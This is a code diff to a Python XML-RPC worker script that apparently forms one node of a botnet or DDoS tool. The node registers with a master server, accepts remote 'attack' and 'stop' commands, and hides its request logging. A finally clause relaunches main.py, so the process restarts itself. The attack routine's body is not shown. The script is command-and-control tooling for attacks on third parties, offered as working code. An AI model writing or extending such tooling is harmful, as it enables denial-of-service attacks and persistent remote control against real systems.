@@ -1,3 +1,4 @@
+import signal
 import os
 import sys
 import socket
@@ -5,6 +6,8 @@ import platform
 import xmlrpc.client
 from xmlrpc.server import SimpleXMLRPCServer, SimpleXMLRPCRequestHandler
 from socketserver import ThreadingMixIn
+
+s = xmlrpc.client.ServerProxy("http://192.168.1.5:8000")
 
 
 def getIpAddress():
@@ -20,18 +23,28 @@ class RequestHandler(SimpleXMLRPCRequestHandler):
 
 
 def listenMaster(ip_master):
-    server = SimpleThreadXMLRPCServer(
-        (getIpAddress(), 5000), requestHandler=RequestHandler, allow_none=True)
+    server = SimpleThreadXMLRPCServer((getIpAddress(), 5000),
+                                      requestHandler=RequestHandler,
+                                      logRequests=False,
+                                      allow_none=True,
+                                      )
     server.register_introspection_functions()
     server.register_function(attackTarget, "attack_target")
     server.register_function(receiveCommand, "give_command")
     server.serve_forever()
 
 
+def stopAttack():
+    s.unregister_ip(ip_address)
+    os.kill(os.getpid(), signal.CTRL_C_EVENT)
+
+
 def receiveCommand(message):
     """receive command from master"""
     if message["type"] == "attack":
         attackTarget(message)
+    elif message["type"] == "stop":
+        stopAttack()
 
 
 def get_platform():
@@ -53,7 +66,6 @@ def attackTarget(message):
 
 
 if __name__ == '__main__':
-    s = xmlrpc.client.ServerProxy("http://192.168.1.5:8000")
     print(s.system.listMethods())
     ip_address = getIpAddress()
     s.register_ip(ip_address)
@@ -62,3 +74,5 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         s.unregister_ip(ip_address)
         sys.exit(0)
+    finally:
+        os.system("python main.py")
